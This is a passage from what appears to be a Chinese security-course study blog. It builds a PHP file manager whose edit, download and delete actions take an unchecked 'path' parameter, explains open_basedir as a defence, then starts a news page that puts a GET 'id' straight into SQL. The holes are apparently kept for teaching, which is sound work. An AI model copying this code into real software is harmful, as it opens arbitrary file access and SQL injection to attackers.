&lt;a href=<span class="string">&quot;?a=down&amp;path=&lt;?php echo <span class="subst">$v</span>[&#x27;file_path&#x27;]?&gt;&quot;</span>&gt;下载&lt;/a&gt;</span><br><span class="line">                &lt;a href=<span class="string">&quot;?a=del&amp;path=&lt;?php echo <span class="subst">$v</span>[&#x27;file_path&#x27;]?&gt;&quot;</span>&gt;删除&lt;/a&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p><strong>unlink()</strong> 文件删除函数<br>调用命令删除：system shell_exec exec等</p>
<p>首先在html源码对于文件的循环处，增加删除文件的触发绑定，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;?a=del&amp;path=&lt;?php echo <span class="subst">$v</span>[&#x27;file_path&#x27;]?&gt;&quot;</span>&gt;delete&lt;/a&gt;：</span><br><span class="line"></span><br><span class="line"> 生成一个<span class="string">&quot;删除&quot;</span>链接，链接到删除文件的路径。</span><br><span class="line"> 当用户点击这个链接时，会向服务器发送一个请求，请求删除文件的操作。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>在php源码中完成文件删除的有关代码实现<br><strong>isset($_GET[‘a’])</strong>: 检查是否存在名为 a 的 URL 参数。<br><strong>? $_GET[‘a’] : ‘’:</strong> 如果 a 参数存在，则将其值赋给 $action；如果不存在，则将 $action 赋为空字符串 ‘’。（三目运算符）</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">这行代码是用于获取 URL 参数 a 的值，表示操作类型。具体解释如下：</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">action = isset(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">// 接受方法 判断是怎么操作</span><br><span class="line">switch ($action) &#123;</span><br><span class="line">    case &#x27;del&#x27;:</span><br><span class="line">        // 如果操作类型是删除 (&#x27;del&#x27;)</span><br><span class="line">        unlink($file);</span><br><span class="line">        // 使用 unlink 函数删除文件</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/235d195cbe9d0c488a2b9a2f0fce8a5e.png" alt="Untitled"></p>
</li>
</ul>
<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><p>修改HTTP头实现文件读取解析下载：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);: 设置响应内容的类型为二进制流（<span class="keyword">binary</span> stream）。这告诉浏览器，服务器将发送二进制数据，通常用于文件下载。</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=\&quot;&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>) . <span class="string">&quot;\&quot;&quot;</span>);: 设置浏览器提示下载，同时指定下载文件的名称。<span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>) 用于获取文件名。</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>));: 设置响应内容的长度为文件大小。这有助于确保浏览器知道文件的总大小。</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);: 读取并输出文件内容。这将把文件的内容发送到浏览器。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样，当用户访问包含这段代码的页面时，浏览器将接收到这些头信息，然后提示用户下载名为 <strong><code>$file</code></strong> 的文件。</p>
<ul>
<li>首先在html源码对于文件的循环处，增加删除文件的触发绑定，</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;?a=down&amp;path=&lt;?php echo $v[&#x27;file_path&#x27;]?&gt;&quot;&gt;下载&lt;/a&gt;</span><br><span class="line">  **生成一个“下载”链接，链接到下载文件的路径。</span><br><span class="line">  当用户点击这个链接时，会向服务器发送一个请求，请求下载文件的操作。**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>在php源码中完成文件下载的有关代码实现</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//接受方法 判断是怎么操作</span><br><span class="line">switch ($action)&#123;</span><br><span class="line">    case &#x27;del&#x27;:</span><br><span class="line">        unlink($file);</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;down&#x27;:</span><br><span class="line">        header(&quot;Content-Type: application/octet-stream&quot;);</span><br><span class="line">        // 设置响应内容的类型为二进制流</span><br><span class="line">        header(&quot;Content-Disposition: attachment; filename=\&quot;&quot; . $file . &quot;\&quot;&quot;);</span><br><span class="line">        // 设置浏览器提示下载，并指定下载文件的名称（使用 $file 变量）</span><br><span class="line">        header(&quot;Content-Length: &quot; . filesize($file));</span><br><span class="line">        // 设置响应内容的长度为文件大小</span><br><span class="line">        readfile($file);</span><br><span class="line">        // 读取并输出文件内容</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250516194547266.png" alt="image-20250516194547266"></p>
<h3 id="文件编辑"><a href="#文件编辑" class="headerlink" title="文件编辑"></a>文件编辑</h3><p>1、file_get_contents() 读取文件内容<br>2、fopen() fread() 文件打开读入</p>
<ul>
<li>首先在html源码对于文件的循环处，增加编辑文件的触发绑定</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`&lt;a href=&quot;?a=edit&amp;path=&lt;?php echo $v[&#x27;file_path&#x27;]?&gt;&quot;&gt;编辑&lt;/a&gt;`:</span><br><span class="line">   **生成一个“编辑”链接，链接到编辑文件的路径。</span><br><span class="line">   当用户点击这个链接时，会向服务器发送一个请求，请求编辑文件的操作。**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在php源码中完成文件下载的有关代码实现</p>
<ul>
<li>完成switch编辑文章内容<strong>展现的部分</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">case &#x27;edit&#x27;:</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        // 读取文件内容并存储在 $content 变量中</span><br><span class="line"></span><br><span class="line">        echo &#x27;&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&#x27;;</span><br><span class="line">        // 输出表单的开始标签，使用 POST 方法提交到当前页面</span><br><span class="line">        echo &quot;文件名：&quot; . $file . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        // 输出文件名</span><br><span class="line">        echo &quot;文件内容：&lt;br&gt;&quot;;</span><br><span class="line">        echo &#x27;&lt;textarea name=&quot;code&quot; style=&quot;resize:none;&quot; rows=&quot;100&quot; cols=&quot;100&quot;&gt;&#x27; . $content . &#x27;&lt;/textarea&gt;&lt;br&gt;&#x27;;</span><br><span class="line">        // 输出包含文件内容的文本区域</span><br><span class="line">        echo &#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;&#x27;;</span><br><span class="line">        // 输出提交按钮</span><br><span class="line">        echo &#x27;&lt;/form&gt;&#x27;;</span><br><span class="line">        // 输出表单的结束标签</span><br><span class="line">        break;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/d276001d7dd36d0381648f97f8a50501.png" alt="Untitled"></p>
<p>完成触发编辑提交的按钮后，写入文件的源码</p>
<p>w+ 是 fopen 函数中用于打开文件的模式之一，表示以读写方式打开文件，并将文件指针指向文件的开头。如果文件不存在，则尝试创建文件。如果文件已存在，将截断文件内容（即清空文件），然后重新写入。</p>
<p>具体含义如下：</p>
<p>​	w: 以写入（write）方式打开文件。如果文件不存在，则尝试创建文件。如果文件已存在，则截断文件内容，即清空文件。<br>​	+: 以读取（read）方式打开文件。这个符号表示文件可同时进行读写操作。<br>组合在一起，w+ <strong>表示以读写方式打开文件，文件指针指向文件的开头。</strong>在使用 w+ 模式打开文件后，你可以通过 fwrite 函数写入新的内容，同时通过 fread 函数读取文件内容。请注意，使用 w+ 模式打开文件时，原始文件内容会被清空。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#x27;code&#x27;])) &#123;</span><br><span class="line">    // 检查是否存在名为 &#x27;code&#x27; 的 POST 数据</span><br><span class="line"></span><br><span class="line">    $f = fopen(&quot;$path/$file&quot;, &#x27;w+&#x27;);</span><br><span class="line">    // 以读写方式打开文件，如果文件不存在则创建</span><br><span class="line">    fwrite($f, $_POST[&#x27;code&#x27;]);</span><br><span class="line">    // 将 POST 数据中 &#x27;code&#x27; 的内容写入文件</span><br><span class="line">    fclose($f);</span><br><span class="line">    // 关闭文件句柄，确保操作的文件被正确保存。</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,__DIR__);</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">path=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] ?? <span class="string">&#x27;./&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">action = isset(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">path = isset(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]:<span class="string">&#x27;.&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">if(is_file($</span><span class="language-bash">path))</span></span><br><span class="line">&#123;</span><br><span class="line">    //获得文件名</span><br><span class="line">    $file = basename($path);</span><br><span class="line">    //获得路径</span><br><span class="line">    $path = dirname($path);</span><br><span class="line">&#125;</span><br><span class="line">//判断，不是目录</span><br><span class="line">elseif(!is_dir($path))</span><br><span class="line">&#123;</span><br><span class="line">    echo &#x27;我只会吃瓜！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">function getlist($path)&#123;</span><br><span class="line">    $hd=opendir($path);</span><br><span class="line">    while(($file_name=readdir($hd) )!== false)&#123;</span><br><span class="line">        if($file_name != &#x27;.&#x27; &amp;&amp; $file_name != &#x27;..&#x27;)&#123;</span><br><span class="line">            $file_path = &quot;$path/$file_name&quot;;</span><br><span class="line">            $file_type = filetype($file_path);</span><br><span class="line">        &#125;</span><br><span class="line">        $list[$file_type][] = array( //$file_type = dir 和 file $list[&#x27;dir&#x27;] 和  $list[&#x27;file&#x27;]</span><br><span class="line">            &#x27;file_name&#x27;=&gt;$file_name, //文件名存储键值file_name</span><br><span class="line">            &#x27;file_path&#x27;=&gt;$file_path, //文件路径存储键值file_path</span><br><span class="line">            &#x27;file_size&#x27;=&gt;round(filesize($file_path)/1024), //通过换算文件大小存储键值file_path</span><br><span class="line">            &#x27;file_time&#x27;=&gt;date(&#x27;Y/m/d H:i:s&#x27;,filemtime($file_path)), //获取文件时间并存储键值file_path</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    closedir($hd);</span><br><span class="line">    return $list;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">list=getlist(<span class="variable">$path</span>);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//接受方法 判断是怎么操作</span><br><span class="line">//echo $action;</span><br><span class="line">switch ($action)&#123;</span><br><span class="line">    case &#x27;del&#x27;:</span><br><span class="line">        unlink($file);</span><br><span class="line">        //$cmd=&quot;del $file&quot;;</span><br><span class="line">        //system($cmd);</span><br><span class="line">        //echo $cmd;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;down&#x27;:</span><br><span class="line">        header(&quot;Content-Type: application/octet-stream&quot;);</span><br><span class="line">        header(&quot;Content-Disposition: attachment; filename=\&quot;&quot; . $file . &quot;\&quot;&quot;);</span><br><span class="line">        header(&quot;Content-Length: &quot; . filesize($file));</span><br><span class="line">        readfile($file);</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;edit&#x27;:</span><br><span class="line">        $content=file_get_contents($file);</span><br><span class="line">        echo &#x27;&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&#x27;;</span><br><span class="line">        echo &quot;文件名：&quot;.$file.&quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;文件内容：&lt;br&gt;&quot;;</span><br><span class="line">        echo &#x27;&lt;textarea name=&quot;code&quot; style=&quot;resize:none;&quot; rows=&quot;100&quot; cols=&quot;100&quot;&quot;&gt;&#x27;.$content.&#x27;&lt;/textarea&gt;&lt;br&gt;&#x27;;</span><br><span class="line">        echo &#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;&#x27;;</span><br><span class="line">        echo &#x27;&lt;/form&gt;&#x27;;</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//检测编辑后提交的事件 进入文件重新写入</span><br><span class="line"><span class="meta prompt_">if(isset($</span><span class="language-bash">_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span></span><br><span class="line">    $f=fopen(&quot;$path/$file&quot;,&#x27;w+&#x27;);</span><br><span class="line">    fwrite($f,$_POST[&#x27;code&#x27;]);</span><br><span class="line">    fclose($f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;table width=&quot;100%&quot; style=&quot;font-size: 10px;text-align: center;&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;图标&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;名称&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;日期&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;大小&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;路径&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;?php  foreach ($list[&#x27;dir&#x27;] as $v): ?&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;img src=&quot;./img/list.png&quot; width=&quot;20&quot; height=&quot;20&quot;&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;?php echo $v[&#x27;file_name&#x27;]?&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;?php echo $v[&#x27;file_time&#x27;]?&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;-&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;?php echo $v[&#x27;file_path&#x27;]?&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=&quot;?path=&lt;?php echo $v[&#x27;file_path&#x27;]?&gt;&quot;&gt;打开&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;?php endforeach;?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php  foreach ($list[&#x27;file&#x27;] as $v): ?&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;img src=&quot;./img/file.png&quot; width=&quot;20&quot; height=&quot;20&quot;&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;?php echo $v[&#x27;file_name&#x27;]?&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;?php echo $v[&#x27;file_time&#x27;]?&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;?php echo $v[&#x27;file_size&#x27;]?&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;?php echo $v[&#x27;file_path&#x27;]?&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;a href=&quot;?a=edit&amp;path=&lt;?php echo $v[&#x27;file_path&#x27;]?&gt;&quot;&gt;编辑&lt;/a&gt;</span><br><span class="line">                &lt;a href=&quot;?a=down&amp;path=&lt;?php echo $v[&#x27;file_path&#x27;]?&gt;&quot;&gt;下载&lt;/a&gt;</span><br><span class="line">                &lt;a href=&quot;?a=del&amp;path=&lt;?php echo $v[&#x27;file_path&#x27;]?&gt;&quot;&gt;删除&lt;/a&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;?php endforeach;?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="防御机制"><a href="#防御机制" class="headerlink" title="防御机制"></a>防御机制</h3><p><strong>open_basedir：PHP.INI中的设置用来控制脚本程序访问目录</strong><br><strong>ini_set(‘open_basedir’,<code>__DIR__</code>); 设置配置文件中，只能访问本目录</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;, __DIR__);: 使用 ini_set 函数设置 PHP 配置项。</span><br><span class="line">&#x27;open_basedir&#x27;: 是要设置的配置项，它规定了允许访问的文件和目录的根路径。</span><br><span class="line">__DIR__: 这是一个 PHP 预定义常量，表示当前脚本所在的目录。在这里，open_basedir 被设置为当前脚本所在的目录，即只允许 PHP 脚本访问当前目录及其子目录下的文件和目录。</span><br></pre></td></tr></table></figure>

<p>通过设置 <strong><code>open_basedir</code><strong>，你可以限制 PHP 脚本只能访问指定路径下的文件和目录，以增强安全性。在这个例子中，</strong><code>open_basedir</code></strong> 被设置为当前脚本所在的目录，这意味着 PHP 脚本只能访问当前目录及其子目录下的文件和目录，而不能越过这个限制。</p>
<ul>
<li>解决方式：<ul>
<li>在代码中设置<strong>ini_set(‘open_basedir’,<code>__DIR__</code>);、</strong></li>
<li>在<strong>open_basedir：PHP.INI中的设置用来控制脚本程序访问目录</strong></li>
</ul>
</li>
</ul>
<h2 id="第五天"><a href="#第五天" class="headerlink" title="第五天"></a>第五天</h2><p>PHP应用&amp;模版引用&amp;Smarty渲染&amp;MVC模型&amp;数据联动&amp;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a>安全</p>
<h3 id="数据库操作读取显示"><a href="#数据库操作读取显示" class="headerlink" title="数据库操作读取显示"></a><strong>数据库操作读取显示</strong></h3><p>操作步骤</p>
<blockquote>
<p>1、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%9B%E5%BB%BA&spm=1001.2101.3001.7020">数据库创建</a>新闻存储<br>2、代码连接数据库读取<br>3、页面进行自定义显示</p>
</blockquote>
<p>1、创建新闻所需要的存储库</p>
<p>打开数据库创建新的新闻数据库（new）</p>
<p>​	创建字段名（id title author content image）</p>
<p>​	给数据库（new）写入新数据 image写保存好的图片路径即可</p>
<p><img src="/img/xiaodi/90123540f30e33bf0c9c978f13aa59e8.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/99f7f8ab4600d0fda94390df157396e5.png" alt="Untitled"></p>
<p>2、输入相关简单代码，能把数据库中的资料显示出来看</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 包含数据库配置文件</span><br><span class="line">include &#x27;config.php&#x27;;</span><br><span class="line"></span><br><span class="line">// 从GET请求中获取id参数，如果不存在则默认为1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="string">&#x27;1&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">// 构建SQL查询语句</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sql = <span class="string">&quot;select * from new where id=<span class="variable">$id</span>&quot;</span>;</span></span><br><span class="line"></span><br><span class="line">// 执行查询并获取结果集</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">data = mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span></span><br><span class="line"></span><br><span class="line">// 使用mysqli_fetch_row遍历结果集的每一行</span><br><span class="line">while ($row = mysqli_fetch_row($data)) &#123;</span><br><span class="line">    // 输出标题，注意：mysqli_fetch_row返回的是枚举数组，索引从0开始</span><br><span class="line">    echo &quot;标题: &lt;title&gt;&quot; . $row[1] . &quot;&lt;/title&gt;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    // 输出第二列数据</span><br><span class="line">    echo $row[2] . &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    // 输出第三列数据</span><br><span class="line">    echo $row[3] . &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    // 输出图片，注意：在HTML中使用$row[4]作为图片路径</span><br><span class="line">    echo &quot;&lt;img src=&#x27;$row[4]&#x27; width=&#x27;300&#x27; height=&#x27;300&#x27;&gt;&lt;/img&gt;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 关闭数据库连接</span><br><span class="line"><span class="meta prompt_">mysqli_close($</span><span class="language-bash">con);</span></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/650160b372491dd42bc28761137d1207.png" alt="Untitled"></p>
<h3 id="实现模板引用"><a href="#实现模板引用" class="headerlink" title="实现模板引用"></a>实现模板引用</h3><blockquote>
<p>1、页面显示样式编排<br>2、显示数据插入页面<br>3、引用模版调用触发</p>
</blockquote>
<p>1、创建new.html前端模板代码</p>
<p><img src="/img/xiaodi/ec7d0c069ea6e2bf5928a199ef2e4e55.png" alt="Untitled"></p>
<p>创建新的数据库news</p>
<p><img src="/img/xiaodi/8d73c7beedb01f39e2732d50e40aa36c.png" alt="Untitled"></p>
<p>改变以下源代码，将数据库中的元素	，替换为使用html渲染，</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 从文件中读取HTML模板内容</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">template = file_get_contents(<span class="string">&#x27;new.html&#x27;</span>);</span></span><br><span class="line"></span><br><span class="line">// 使用mysqli_fetch_row遍历结果集的每一行</span><br><span class="line">while ($row = mysqli_fetch_row($data)) &#123;</span><br><span class="line">    // 从结果集中获取每一列的值，并存储到相应的变量中</span><br><span class="line">    $page_title = $row[1];</span><br><span class="line">    $heading = $row[2];</span><br><span class="line">    $subheading = $row[3];</span><br><span class="line">    $content = $row[4];</span><br><span class="line">    $item = $row[5];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 替换HTML模板中的占位符</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">template = str_replace(<span class="string">&#x27;&#123;page_title&#125;&#x27;</span>, <span 